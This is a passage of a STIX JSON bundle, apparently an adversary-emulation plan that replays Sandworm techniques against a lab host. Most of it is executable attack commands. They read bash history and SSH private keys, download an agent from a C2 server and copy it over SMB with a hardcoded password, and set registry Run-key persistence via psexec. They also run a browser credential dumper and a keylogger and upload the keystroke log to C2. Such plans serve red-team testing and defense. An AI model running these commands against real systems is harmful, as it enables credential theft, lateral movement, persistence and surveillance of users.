                                "command": "cat /home/#{initial.user.name}/.bash_history"
                            }
                        }
                    },
                    "technique_name": "Unsecured Credentials: Bash History"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--1879f952-9eb2-4b17-a27c-4c5143d94064",
            "created": "2024-02-04T21:44:08.237814Z",
            "modified": "2024-02-04T21:44:08.237814Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--40934e60-6b0d-4d3b-a8f5-ad111c6a0abc",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--a398ee96-38ff-4502-b36d-6c705bd60943",
            "created": "2024-02-04T21:44:08.238078Z",
            "modified": "2024-02-04T21:44:08.238078Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--40934e60-6b0d-4d3b-a8f5-ad111c6a0abc"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--dc3152ac-1014-4f96-98c9-a64d5a61712e",
            "created": "2024-02-04T21:44:08.23885Z",
            "modified": "2024-02-04T21:44:08.23885Z",
            "name": "Sandworm Get SSH Keys",
            "description": "Sandworm reads SSH keys. Note: not in CTI but in TTP scope.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1552.004",
                    "input_arguments": {
                        "initial.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target user account for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "cat /home/#{initial.user.name}/.ssh/id_rsa;\ncat /home/#{initial.user.name}/.ssh/id_rsa.pub;\n"
                            }
                        }
                    },
                    "technique_name": "Unsecured Credentials: Private Keys"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--24bd0263-b61c-4860-af65-e12741694ab5",
            "created": "2024-02-04T21:44:08.273684Z",
            "modified": "2024-02-04T21:44:08.273684Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--dc3152ac-1014-4f96-98c9-a64d5a61712e",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--be7ab1a8-197c-42d5-985a-ec3e91d706ef",
            "created": "2024-02-04T21:44:08.274137Z",
            "modified": "2024-02-04T21:44:08.274137Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--dc3152ac-1014-4f96-98c9-a64d5a61712e"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--ee1e23ad-87d4-4d69-932f-2e5631508c8e",
            "created": "2024-02-04T21:44:08.274457Z",
            "modified": "2024-02-04T21:44:08.274457Z",
            "name": "Sandworm Upload Agent to Windows Host",
            "description": "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.\nSandworm Team has used previously acquired legitimate credentials prior to attacks.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1021.002",
                    "input_arguments": {
                        "second.target.host": {
                            "default": "10.0.1.7",
                            "description": "The hostname or IPv4 address of the target host for lateral movement.",
                            "type": "string"
                        },
                        "second_host.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target local user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        },
                        "second_host.user.password": {
                            "default": "Whg42WbhhCE17FEzrqeJ",
                            "description": "The password of the target user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "rm wsmprovav.exe\n",
                                "command": "server=\"#{server}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:windows\" -H \"server:$server\" -H \"group:gammu\" $server/file/download > wsmprovav.exe;\nchmod +x wsmprovav.exe;\nsmbclient -U 'WORKGROUP\\#{second_host.user.name}' //#{second.target.host}/ADMIN$ -c \"put ./wsmprovav.exe wsmprovav.exe;\" \"#{second_host.user.password}\"\n"
                            }
                        }
                    },
                    "technique_name": "Remote Services: SMB/Windows Admin Shares"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--1290ed9a-c825-40d5-b22f-514a82fe3ff7",
            "created": "2024-02-04T21:44:08.286763Z",
            "modified": "2024-02-04T21:44:08.286763Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--ee1e23ad-87d4-4d69-932f-2e5631508c8e",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--4d1084be-71e9-4cc6-b5e1-9e4cee72bc3d",
            "created": "2024-02-04T21:44:08.287891Z",
            "modified": "2024-02-04T21:44:08.287891Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--ee1e23ad-87d4-4d69-932f-2e5631508c8e",
            "target_ref": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4",
            "value": "10.0.1.7"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--80a13b0e-ac92-408d-96aa-0ef8e5c873a3",
            "created": "2024-02-04T21:44:08.298496Z",
            "modified": "2024-02-04T21:44:08.298496Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--ee1e23ad-87d4-4d69-932f-2e5631508c8e",
            "target_ref": "user-account--27475f3a-c3af-4c54-a45a-5e28d0caf14a"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--27475f3a-c3af-4c54-a45a-5e28d0caf14a",
            "credential": "Whg42WbhhCE17FEzrqeJ"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--e4863802-395b-4694-8956-191ae3646219",
            "created": "2024-02-04T21:44:08.299299Z",
            "modified": "2024-02-04T21:44:08.299299Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--ee1e23ad-87d4-4d69-932f-2e5631508c8e"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--57771abd-0789-4dda-bb02-31359e6860db",
            "created": "2024-02-04T21:44:08.299717Z",
            "modified": "2024-02-04T21:44:08.299717Z",
            "name": "Sandworm Service Creation/Execution and Registry Persistence",
            "description": "Uses psexec.py to gain a bind-shell to target over SMB (TCP 445).\nLoads the registry hive for target user. Set registry persistence for target user only, which will\nexecute the previously uploaded agent executable.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1569.002",
                    "input_arguments": {
                        "second.target.host": {
                            "default": "10.0.1.7",
                            "description": "The hostname or IPv4 address of the target host for lateral movement.",
                            "type": "string"
                        },
                        "second_host.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target local user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        },
                        "second_host.user.password": {
                            "default": "Whg42WbhhCE17FEzrqeJ",
                            "description": "The password of the target user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "./psexec_sandworm.py -service-name \"Windows Check AV\" WORKGROUP/#{second_host.user.name}:#{second_host.user.password}@#{second.target.host} cmd /c 'reg.exe LOAD HKU\\Temp \"C:\\Users\\#{second_host.user.name}\\NTUSER.DAT\" & reg.exe ADD HKU\\Temp\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d \"C:\\Windows\\wsmprovav.exe\"' 2>&1\n",
                                "payloads": [
                                    "psexec_sandworm.py"
                                ],
                                "timeout": 120
                            }
                        }
                    },
                    "technique_name": "System Services: Service Execution"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--8995122b-87c3-4617-b043-08c1db937835",
            "created": "2024-02-04T21:44:08.315137Z",
            "modified": "2024-02-04T21:44:08.315137Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--57771abd-0789-4dda-bb02-31359e6860db",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--663408d6-eee5-4ef7-ac55-f849b905fcbb",
            "created": "2024-02-04T21:44:08.315744Z",
            "modified": "2024-02-04T21:44:08.315744Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--57771abd-0789-4dda-bb02-31359e6860db",
            "target_ref": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4",
            "value": "10.0.1.7"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--72394778-ef4c-405d-aebc-403557d59473",
            "created": "2024-02-04T21:44:08.317578Z",
            "modified": "2024-02-04T21:44:08.317578Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--57771abd-0789-4dda-bb02-31359e6860db",
            "target_ref": "user-account--c0df03d4-3f4e-441b-92d7-18b90a59e9c2"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--c0df03d4-3f4e-441b-92d7-18b90a59e9c2",
            "credential": "Whg42WbhhCE17FEzrqeJ"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--781b5e87-1e32-4c16-b6da-a9162309c0a5",
            "created": "2024-02-04T21:44:08.318396Z",
            "modified": "2024-02-04T21:44:08.318396Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--57771abd-0789-4dda-bb02-31359e6860db"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--c4c08a1f-15d6-4dfd-9ba7-9b61594762ff",
            "created": "2024-02-04T21:44:08.318997Z",
            "modified": "2024-02-04T21:44:08.318997Z",
            "name": "Sandworm RDP to Execute Agent Implant",
            "description": "RDP into target host to trigger the registry persistence which will execute the uploaded agent implant.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1547.001",
                    "input_arguments": {
                        "second.target.host": {
                            "default": "10.0.1.7",
                            "description": "The hostname or IPv4 address of the target host for lateral movement.",
                            "type": "string"
                        },
                        "second_host.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target local user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        },
                        "second_host.user.password": {
                            "default": "Whg42WbhhCE17FEzrqeJ",
                            "description": "The password of the target user account for lateral movement. May be the same as the user for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "exec-background xfreerdp +clipboard /u:WORKGROUP\\\\#{second_host.user.name} /p:\"#{second_host.user.password}\" /v:#{second.target.host} /cert-ignore\n"
                            }
                        }
                    },
                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--5d99b166-2efa-41a7-ae16-d629e4d3f486",
            "created": "2024-02-04T21:44:08.333312Z",
            "modified": "2024-02-04T21:44:08.333312Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--c4c08a1f-15d6-4dfd-9ba7-9b61594762ff",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--5f0d0937-17d2-4ca6-855e-2c1022322c6d",
            "created": "2024-02-04T21:44:08.334103Z",
            "modified": "2024-02-04T21:44:08.334103Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--c4c08a1f-15d6-4dfd-9ba7-9b61594762ff",
            "target_ref": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--e74e49c3-90e9-5d62-a9fb-8a4a471afea4",
            "value": "10.0.1.7"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--42d0e3d3-7096-4497-88f1-4a0cace00710",
            "created": "2024-02-04T21:44:08.342292Z",
            "modified": "2024-02-04T21:44:08.342292Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--c4c08a1f-15d6-4dfd-9ba7-9b61594762ff",
            "target_ref": "user-account--c8a9f19b-ce86-43c2-9272-1b3b80e7826b"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--c8a9f19b-ce86-43c2-9272-1b3b80e7826b",
            "credential": "Whg42WbhhCE17FEzrqeJ"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--c4a1826c-f6d0-43da-83df-dbc5fc0c6d88",
            "created": "2024-02-04T21:44:08.342983Z",
            "modified": "2024-02-04T21:44:08.342983Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--c4c08a1f-15d6-4dfd-9ba7-9b61594762ff"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--236fd943-2bd8-400a-9a63-33f724629ca4",
            "created": "2024-02-04T21:44:08.343309Z",
            "modified": "2024-02-04T21:44:08.343309Z",
            "name": "Sandworm Wait For Lat Move Target Beacon",
            "description": "Wait for the registry persistence to trigger and for the new agent beacon to come in.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1547.001",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "sleep 40\n"
                            }
                        }
                    },
                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--d3976247-313f-4e34-b90c-6a8704bddc01",
            "created": "2024-02-04T21:44:08.343585Z",
            "modified": "2024-02-04T21:44:08.343585Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--236fd943-2bd8-400a-9a63-33f724629ca4"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--e870a202-354f-4214-82e6-c5f88cb33b65",
            "created": "2024-02-04T21:44:08.343843Z",
            "modified": "2024-02-04T21:44:08.343843Z",
            "name": "Sandworm Windows Discovery - Current User",
            "description": "Sandworm Team has collected the username from a compromised host.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1033",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "proc": {
                                "command": "whoami.exe"
                            }
                        }
                    },
                    "technique_name": "System Owner/User Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--d1070f81-94c5-46b5-a1d6-add77db626e9",
            "created": "2024-02-04T21:44:08.344078Z",
            "modified": "2024-02-04T21:44:08.344078Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--e870a202-354f-4214-82e6-c5f88cb33b65"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--90cbd004-d5e9-4b05-9abe-12b93f77ede3",
            "created": "2024-02-04T21:44:08.344333Z",
            "modified": "2024-02-04T21:44:08.344333Z",
            "name": "Sandworm Windows Discovery - Windows Version Info",
            "description": "Sandworm Team enumerates information about the infected system's operating system.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1082",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMajorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMinorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuild\n"
                            }
                        }
                    },
                    "technique_name": "System Information Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--492a034a-f9f2-49cf-84ee-a1fc748c816f",
            "created": "2024-02-04T21:44:08.359146Z",
            "modified": "2024-02-04T21:44:08.359146Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--90cbd004-d5e9-4b05-9abe-12b93f77ede3"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--fa3ea4c1-c980-41b1-be78-c8c932d68e98",
            "created": "2024-02-04T21:44:08.359548Z",
            "modified": "2024-02-04T21:44:08.359548Z",
            "name": "Sandworm Windows Discovery - List Entire File System",
            "description": "Sandworm Team has enumerated files on a compromised host.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1083",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "cleanup": "del dir.out\n",
                                "command": "dir /s /b C:\\ > dir.out\n",
                                "timeout": 180,
                                "uploads": [
                                    "dir.out"
                                ]
                            }
                        }
                    },
                    "technique_name": "File and Directory Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--b4ee168b-021a-429d-bc22-4d15a41a85d2",
            "created": "2024-02-04T21:44:08.359945Z",
            "modified": "2024-02-04T21:44:08.359945Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--fa3ea4c1-c980-41b1-be78-c8c932d68e98"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--73decaa1-5ba3-4739-812d-633929a158fd",
            "created": "2024-02-04T21:44:08.36021Z",
            "modified": "2024-02-04T21:44:08.36021Z",
            "name": "Sandworm Windows Discovery - List RDP Connections",
            "description": "Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1049",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "netstat -ano | findstr 3389\n"
                            }
                        }
                    },
                    "technique_name": "System Network Connections Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--238ad432-4ad4-4b19-98ea-74c96ce138b0",
            "created": "2024-02-04T21:44:08.360454Z",
            "modified": "2024-02-04T21:44:08.360454Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--73decaa1-5ba3-4739-812d-633929a158fd"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--9a438a2a-c95b-4fd2-a29f-8b1250fc3adc",
            "created": "2024-02-04T21:44:08.360694Z",
            "modified": "2024-02-04T21:44:08.360694Z",
            "name": "Sandworm Download Web Credential Dumper",
            "description": "Sandworm downloads web credential dumper oradump.exe to disk.\noradump.exe is a variant of the open source tool, LaZagne.\nIt has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "move .\\dumpWebBrowserCreds.exe C:\\Windows\\System32\\oradump.exe\n",
                                "payloads": [
                                    "dumpWebBrowserCreds.exe"
                                ]
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--3963434d-852d-4175-a880-37ace2349f0f",
            "created": "2024-02-04T21:44:08.360913Z",
            "modified": "2024-02-04T21:44:08.360913Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--9a438a2a-c95b-4fd2-a29f-8b1250fc3adc"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--1da1b17e-66fd-4f39-bf10-203570a62624",
            "created": "2024-02-04T21:44:08.361147Z",
            "modified": "2024-02-04T21:44:08.361147Z",
            "name": "Sandworm Execute Web Credential Dumper",
            "description": "Sandworm executes web credential dumper oradump.exe.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1555.003",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "C:\\Windows\\System32\\oradump.exe 2>&1\n",
                                "timeout": 300
                            }
                        }
                    },
                    "technique_name": "Credentials from Password Stores: Credentials from Web Browsers"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--980d22d3-0b31-40ab-8c9b-9d67950249c4",
            "created": "2024-02-04T21:44:08.36136Z",
            "modified": "2024-02-04T21:44:08.36136Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--1da1b17e-66fd-4f39-bf10-203570a62624"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--ccbb3c07-dc04-46f5-83d3-54fe71deab3c",
            "created": "2024-02-04T21:44:08.361593Z",
            "modified": "2024-02-04T21:44:08.361593Z",
            "name": "Sandworm Download Keylogger",
            "description": "Sandworm downloads keylogger to disk.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "move .\\keylogger.exe C:\\Windows\\System32\\mslog.exe\n",
                                "payloads": [
                                    "keylogger.exe"
                                ]
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--bd23ebf2-ac9a-4bc5-a7f4-93d45e9cca10",
            "created": "2024-02-04T21:44:08.361808Z",
            "modified": "2024-02-04T21:44:08.361808Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--ccbb3c07-dc04-46f5-83d3-54fe71deab3c"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--1d317399-d786-4c58-889f-01cf496ba5d2",
            "created": "2024-02-04T21:44:08.362039Z",
            "modified": "2024-02-04T21:44:08.362039Z",
            "name": "Sandworm Log Keystrokes",
            "description": "Sandworm runs the keylogger in the background to log keystrokes to mslog.txt.\nSandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1056.001",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "proc": {
                                "command": "exec-background cmd.exe /k \"C:\\Windows\\System32\\mslog.exe -o C:\\Windows\\System32\\mslog.txt\"\n"
                            }
                        }
                    },
                    "technique_name": "Input Capture: Keylogging"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--f50062db-37f9-46c3-a664-9819824b5308",
            "created": "2024-02-04T21:44:08.362249Z",
            "modified": "2024-02-04T21:44:08.362249Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--1d317399-d786-4c58-889f-01cf496ba5d2"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--e895decc-93fa-42bb-8609-3a62d14fcb60",
            "created": "2024-02-04T21:44:08.362481Z",
            "modified": "2024-02-04T21:44:08.362481Z",
            "name": "Sandworm Let Keystroke Logger Run",
            "description": "Wait 30 seconds to allow the operator to perform keystrokes for logging.\nSandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1056.001",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "sleep 30\n"
                            }
                        }
                    },
                    "technique_name": "Input Capture: Keylogging"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--94c6e48e-b3ca-48cf-af80-d69bccad095b",
            "created": "2024-02-04T21:44:08.362691Z",
            "modified": "2024-02-04T21:44:08.362691Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--e895decc-93fa-42bb-8609-3a62d14fcb60"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--5c034afc-1f10-4e92-8d77-afed302d7de5",
            "created": "2024-02-04T21:44:08.362919Z",
            "modified": "2024-02-04T21:44:08.362919Z",
            "name": "Sandworm Verify Keystroke File",
            "description": "Verifies that the mslog.txt file was created.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1056.001",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "dir C:\\Windows\\System32\\mslog.txt\n"
                            }
                        }
                    },
                    "technique_name": "Input Capture: Keylogging"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--3268cd5c-678c-4a98-a83c-24ad264bf621",
            "created": "2024-02-04T21:44:08.363131Z",
            "modified": "2024-02-04T21:44:08.363131Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--5c034afc-1f10-4e92-8d77-afed302d7de5"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--854c63de-cc94-4581-81b0-4c2292123898",
            "created": "2024-02-04T21:44:08.363362Z",
            "modified": "2024-02-04T21:44:08.363362Z",
            "name": "Sandworm Upload Keystroke File",
            "description": "Reads contents of the mslog.txt keystroke file and uploads the file to the C2 server.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1041",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "type C:\\Windows\\System32\\mslog.txt\n",
                                "uploads": [
                                    "C:\\Windows\\System32\\mslog.txt"
                                ]
                            }
                        }
                    },
                    "technique_name": "Exfiltration Over C2 Channel"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--b5199638-d70c-4ce5-8791-52ef5c425729",
            "created": "2024-02-04T21:44:08.363576Z",
            "modified": "2024-02-04T21:44:08.363576Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--854c63de-cc94-4581-81b0-4c2292123898"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--65639630-733c-4179-8543-2c64cb577ca0",
            "created": "2024-02-04T21:44:08.363811Z",
            "modified": "2024-02-04T21:44:08.363811Z",
            "name": "Sandworm Stop Keystroke Logger",
            "description": "Terminates the mslog.exe keystroke process.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1056.001",
                    "input_arguments": null,
                    "platforms": {
                        "windows": {
                            "cmd": {
                                "command": "taskkill /F /IM mslog.exe\n"
                            }
                        }
                    },
                    "technique_name": "Input Capture: Keylogging"
                }
            }
        },
        {
            "type": "relationship",
